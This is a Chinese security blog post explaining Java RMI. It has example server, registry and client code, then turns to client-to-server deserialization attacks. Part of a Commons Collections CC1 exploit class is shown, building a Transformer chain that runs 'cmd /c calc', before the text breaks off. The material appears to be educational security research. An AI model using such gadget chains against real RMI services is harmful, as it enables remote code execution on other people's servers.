---
title: JAVA安全之RMI注入与攻击方式
url: https://mp.weixin.qq.com/s/_4pc6gQQDVOdGmWotnV6yQ
source: Doonsec's feed
date: 2026-01-19
fetch_date: 2026-01-20T03:33:07.145970
---

# JAVA安全之RMI注入与攻击方式

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/NCLsGXruwoRQYAUNYmdapJSvzvIuhbAKoZciaWOzCUfTYOCEQ46ibjbJYnzu6pRttSibUibtqja1L6CeFMgvicyQA3A/0?wx_fmt=jpeg)

# JAVA安全之RMI注入与攻击方式

原创

secureyang
secureyang

secureyang

![]()

在小说阅读器中沉浸阅读

本公众号所发文章仅用于技术交流学习，不得用于任何违法犯罪目的，一切后果自行承担，与本公众号以及作者无关。

RMI注入与攻击方式一、简介二、RMI简单案例服务端远程对象接口声明类远程对象接口实现类注册中心代码客户端远程对象接⼝声明类远程对象请求执行类三、攻击方式客户端攻击服务端案例-CC1接口声明类服务端接口实现类服务端注册中心类客户端攻击代码案例-CC6接口声明类服务端接口实现类与注册中心合为一体客户端攻击测试代码服务端攻击客户端案例-CC6服务端接口声明类服务端接口实现类（主要是用来构造恶意类并注册执行）客户端RMI请求代码四、RMI注入总结

# RMI注入与攻击方式

> 本篇文章所使用项目框架如下图所示
>
> ![image-20250706215504369](https://mmbiz.qpic.cn/sz_mmbiz_png/NCLsGXruwoRQYAUNYmdapJSvzvIuhbAK1zCMJzpiaWpvgcThhNRZYWMTtJXchE7zbDcBdmvdmZYc6PRPVToByjw/640?wx_fmt=png&from=appmsg)

## 一、简介

RMI 全称 Remote Method Invocation（远程⽅法调⽤），即在⼀个 JVM 中 Java 程序调⽤在另⼀ 个远程 JVM 中运⾏的 Java 程序，这个远程 JVM 既可以在同⼀台实体机上，也可以在不同的实体机 上，两者之间通过⽹络进⾏通信。

RMI 依赖的通信协议为 JRMP(Java Remote Message Protocol，Java 远程消息交换协议)，该协 议为 Java 定制，要求服务端与客户端都为 Java 编写。

RMI 包含三个部分：

* Server：服务端通过绑定远程对象，这个对象可以封装很多⽹络操作，也就是  Socket
* Client：客户端调⽤服务端的⽅法
* Register：提供服务注册与服务获取，即 Server 端向 Registry 注册服务，⽐如 地址、端⼝等⼀些信息，Client 端从 Registry 获取远程对象的⼀些信息，如地址、端⼝等，然后进⾏远 程调⽤。

## 二、RMI简单案例

个人简单的对RMI的理解就是：

服务端通过五种方式，将内部声明和实现的类绑定到注册中心，通过 socket 对象开放一个RMI的服务，可供其他外部机器访问。

然后，客户端使用 lookup 解析 socket 对象从而连接到服务器开放的RMI服务，此时，如果服务端允许接收一个 Object 对象作为参数，那么我们就可以对服务端进行反序列化攻击，造成**客户端攻击服务端**；相反，如果客户端本地存在Common Collections 组件，且具备相对应的反序列化链条，那么此时再服务端编写好恶意对象，客户端请求时，服务端将恶意对象传给客户端，造成**服务端攻击客户端**。

五种绑定方式分别如下：

* 0->bind
* 1->list
* 2->lookup
* 3->rebind
* 4->unbind

前面所对应的数字分别代表了 java 中RMI服务的源码，源码中使用了 `switch case` 选择器，每 case 一种数字，代表选择一种方法，而这五种方法中，一般只有 **bind  和 rebind  存在反序列化漏洞**，因为他们两个的 case 中，有 `(Remote)var11.readObject()` 这样的代码，他们两个主要用来**注册恶意对象**，而 **lookup** 也是导致反序列化漏洞的原因之一，因为 lookup 是专门用来**获取并反序列化恶意对象的**。

而 list 中根本没有 readobject 方法，因此 list 是完全无法攻击的

而  lookup  与 unbind 虽然内部也有 readobject 方法，但是他们二者的 readobject 方法是被强制类型转换为 String 类型的，因此其他的 Object 对象传入最终稿也无法实现。

### 服务端

#### 远程对象接口声明类

> 声明一个接口，该接口内可以再声明其他的方法，以便后续使用和调用，而且客户端与服务端共用该接口（因为现在是在测试），而且测试的时候尽量将客户端与服务端放在一个包中，不容易报错。

RemoteObj.java

```
 packagecom.rmi;

 importjava.rmi.Remote;
 importjava.rmi.RemoteException;

 publicinterfaceRemoteObjextendsRemote {
     publicStringsayHello(Stringkeywords) throwsRemoteException;
 }
```

此远程接⼝要求作⽤域为 public；  继承 Remote 接⼝；  让其中声明的接⼝⽅法抛出异常。

#### 远程对象接口实现类

> 实现上面声明的接口，其实主要是实现接口中的方法，用重写的方式

RemoteObjImpl.java

```
 packagecom.rmi;

 importjava.rmi.RemoteException;
 importjava.rmi.server.UnicastRemoteObject;
 publicclassRemoteObjImplextendsUnicastRemoteObjectimplementsRemoteObj {
     publicRemoteObjImpl() throwsRemoteException {
     }
     //    UnicastRemoteObject.exportObject(this, 0); //如果不能继承UnicastRemoteObject就需要⼿⼯导出
     @Override
     publicStringsayHello(Stringkeywords) throwsRemoteException {
         System.out.println(" 我是服务端的 sayHello");
         returnkeywords;
     }
 }
```

实现远程接⼝ 继承 UnicastRemoteObject 类，⽤于⽣成 Stub（存根）和 Skeleton（⻣架）。

 构造函数需要抛出⼀个RemoteException错误

 实现类中使⽤的对象必须都可序列化，即都继承 java.io.Serializable

#### 注册中心代码

RMIServer.java

```
 packagecom.rmi;

 importjava.net.MalformedURLException;
 importjava.rmi.AlreadyBoundException;
 importjava.rmi.RemoteException;
 importjava.rmi.registry.LocateRegistry;
 importjava.rmi.registry.Registry;
 // 实例化远程对象
 // 创建注册中⼼
 publicclassRMIServer {
     publicstaticvoidmain(String[] args) throwsRemoteException, AlreadyBoundException, MalformedURLException {
         RemoteObjremoteObj=newRemoteObjImpl();
         Registryregistry=LocateRegistry.createRegistry(1099);
         // 绑定对象示例到注册中⼼
         registry.bind("remoteObj", remoteObj);
     }
 }
```

创建注册中⼼，其中端⼝默认是1099，然后进⾏绑定到接⼝实现类当中。bind 的

### 客户端

客户端只需从从注册器中获取远程对象，然后调⽤⽅法即可。当然客户端还需要⼀个远程对象的接 ⼝，不然不知道获取回来的对象是什么类型的。

在客户端这⾥，也需要定义⼀个远程对象的接⼝

#### 远程对象接⼝声明类

RemoteObj.java

```
 packagecom.rmi;

 importjava.rmi.Remote;
 importjava.rmi.RemoteException;

 publicinterfaceRemoteObjextendsRemote {
     publicStringsayHello(Stringkeywords) throwsRemoteException;
 }
```

> 客户端的接口声明类与服务端的接口声明类代码是一模一样的，客户端与服务端共享该接口代码

#### 远程对象请求执行类

RMIClient.java

```
 packagecom.rmi;

 importjava.rmi.registry.LocateRegistry;
 importjava.rmi.registry.Registry;

 publicclassRMIClient {
     publicstaticvoidmain(String[] args) throwsException {
         Registryregistry=LocateRegistry.getRegistry("127.0.0.1", 1099);
         RemoteObjremoteObj= (RemoteObj) registry.lookup("remoteObj");
         remoteObj.sayHello("hello");
     }
 }
```

ok，接下来进行运行测试

首先运行服务端

![image-20250706191551297](https://mmbiz.qpic.cn/sz_mmbiz_png/NCLsGXruwoRQYAUNYmdapJSvzvIuhbAKiaJYq7bcL3ia0xeMicgcBAfR5BghPwcKGEia7y4huvzEC7RwPCF5YP88Kw/640?wx_fmt=png&from=appmsg)

然后运行客户端

![image-20250706191613979](https://mmbiz.qpic.cn/sz_mmbiz_png/NCLsGXruwoRQYAUNYmdapJSvzvIuhbAKMqjJTDpXRaXxy7ibf9ibtlAycwjGROvQ9IvGIXiaOrnQlu2SN755McMfA/640?wx_fmt=png&from=appmsg)

此时我们看服务端运行结果是否执行了 sayHello 方法输出了 hello

![image-20250706191651210](https://mmbiz.qpic.cn/sz_mmbiz_png/NCLsGXruwoRQYAUNYmdapJSvzvIuhbAK4PiapIubgwBCvTfu21ecZ5coMUP2OuJ4FYI7Pl75CwND6maJkvXZYpQ/640?wx_fmt=png&from=appmsg)

ok，没有问题

## 三、攻击方式

再本文章中，只介绍 客户端攻击服务端 与 服务端攻击客户端 两种方法

### 客户端攻击服务端

当客户端调用远程方法时，该远程方法若是接收一个 Object 参数，则客户端就可以发送一个恶意对象，而网络传输中肯定是用序列化数据传输对象的，那么服务端接收到数据势必会对其进行反序列化从而获得真实的对象，如果服务端含有存在漏洞的组件，此时我们就可以进行攻击。

利用条件如下：

* Server端有能够传递Object对象的远程⽅法
* Server端安装有包含反序列化漏洞的相关组件 （比如CC）

#### 案例-CC1

##### 接口声明类

User.java

```
 packagecom.rmi.C_Attack_S;
 importjava.rmi.RemoteException;

 publicinterfaceUserextendsjava.rmi.Remote {
     publicObjectgetUser() throwsRemoteException;
     publicvoidaddUser(Objectuser) throwsRemoteException;
 }
```

##### 服务端接口实现类

UserImpl.java

```
 // 文件: src/main/java/com/rmi/server/UserImpl.java
 packagecom.rmi.C_Attack_S.CC1;

 importjava.rmi.RemoteException;
 importjava.rmi.server.UnicastRemoteObject;

 publicclassUserImplextendsUnicastRemoteObjectimplementsUser {
     protectedUserImpl() throwsRemoteException {
         super(); // 必须调用父类构造函数
     }

     @Override
     publicObjectgetUser() throwsRemoteException {
         System.out.println("Server: getUser() called");
         return"testUser";
     }

     @Override
     publicvoidaddUser(Objectuser) throwsRemoteException {
         System.out.println("Server: addUser() called with: "+user);
     }
 }
```

##### 服务端注册中心类

RegistryClass.java

```
 packagecom.rmi.C_Attack_S.CC1;

 // 文件: src/main/java/com/rmi/server/RegistryClass.java

 importjava.rmi.registry.LocateRegistry;
 importjava.rmi.registry.Registry;

 publicclassRegistryClass {
     publicstaticvoidmain(String[] args) {
         try {
             // 创建远程对象实例
             UseruserObj=newUserImpl();

             // 创建注册中心（端口1099）
             Registryregistry=LocateRegistry.createRegistry(1099);

             // 绑定对象到注册中心
             registry.bind("hello", userObj);

             System.out.println("Service 'hello' registered successfully!");
         } catch (Exceptione) {
             e.printStackTrace();
         }
     }
 }
```

##### 客户端攻击代码

LocalUserClientAttack2ServerByCC1.java

```
package com.rmi.C_Attack_S.CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

public class LocalUserClientAttack2ServerByCC1 {
    public static void main(String[] args) throws Exception {
        String execArgs = "cmd /c calc";

        // 构造Transformer链（添加Set转换）
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                      ...